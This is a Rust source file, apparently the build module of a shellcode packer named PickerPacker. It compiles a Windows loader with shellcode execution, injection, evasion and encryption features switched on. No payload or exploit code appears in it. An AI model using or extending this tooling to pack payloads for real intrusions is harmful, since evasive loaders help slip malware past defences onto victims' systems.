// ============================================================================
// Compiler Module - Handle Rust compilation
// ============================================================================

use std::process::Command;
use crate::config::PackerConfig;

/// Build the cargo compile command string with all features
pub fn build_compile_command(config: &PackerConfig) -> String {
    let mut compile_command = "build --release ".to_string();
    
    // Always include shellcode execution and injection features
    compile_command.push_str(&format!("--features {} ", config.execution.feature_name()));
    compile_command.push_str(&format!("--features {} ", config.injection.feature_name()));
    
    // Add utility features
    for utility in &config.utils {
        compile_command.push_str(&format!("--features {} ", utility.feature_name()));
    }
    
    // Add check features
    for check in &config.checks {
        compile_command.push_str(&format!("--features {} ", check.feature_name()));
    }
    
    // Add evasion features
    for evasion in &config.evasion {
        compile_command.push_str(&format!("--features {} ", evasion.feature_name()));
    }
    
    if let Some(encryption) = config.encrypt {
        compile_command.push_str(&format!("--features {} ", encryption.feature_name()));
    }
    
    compile_command.push_str("--manifest-path ./loader/Cargo.toml");
    compile_command.push_str(" --target x86_64-pc-windows-msvc");
    
    compile_command
}

/// Execute the cargo compilation
pub fn compile_loader(compile_command: &str) -> Result<(), Box<dyn std::error::Error>> {
    let parts: Vec<&str> = compile_command.split_whitespace().collect();
    
    let output = Command::new("cargo")
        .args(&parts)
        .output()?;
    
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("Compilation failed:\n{}", stderr).into());
    }
    
    Ok(())
}

/// Move and rename the compiled executable to the root directory
pub fn move_and_rename_executable() -> Result<String, std::io::Error> {
    // Determine source and destination paths
    #[cfg(target_os = "windows")]
    let source = ".\\loader\\target\\x86_64-pc-windows-msvc\\release\\PickerPacker.exe";
    
    #[cfg(target_os = "linux")]
    let source = "./loader/target/x86_64-pc-windows-gnu/release/PickerPacker.exe";
    
    let dest = "PickerPacker_Packed.exe";
    
    // Move the file
    std::fs::rename(source, dest)?;
    
    Ok(dest.to_string())
}
